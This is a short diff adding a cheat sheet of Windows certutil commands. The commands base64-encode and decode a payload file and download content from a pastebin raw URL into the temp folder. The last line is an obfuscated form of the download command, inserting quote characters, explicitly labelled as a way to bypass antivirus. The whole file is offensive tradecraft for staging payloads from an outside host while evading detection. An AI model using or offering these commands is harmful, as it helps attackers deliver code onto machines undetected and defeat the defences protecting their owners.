@@ -1,0 +1,11 @@
+# To encode any file into base64
+certutil -encode payload.bin payload.txt
+
+# To decode back base64 into [fomat].file 
+certutil -decode payload.txt payload.bin
+
+# To download strings from raw http/https
+certutil -f -urlcache https://pastebin.com/raw/foo123 %temp%\foo.txt
+
+# To bypass AV while using urlcache
+certutil -f -ur""""lc""""ache h""""t""""t""""ps:/""""/pastebin.com/raw/foo123 %temp%\foo.txt
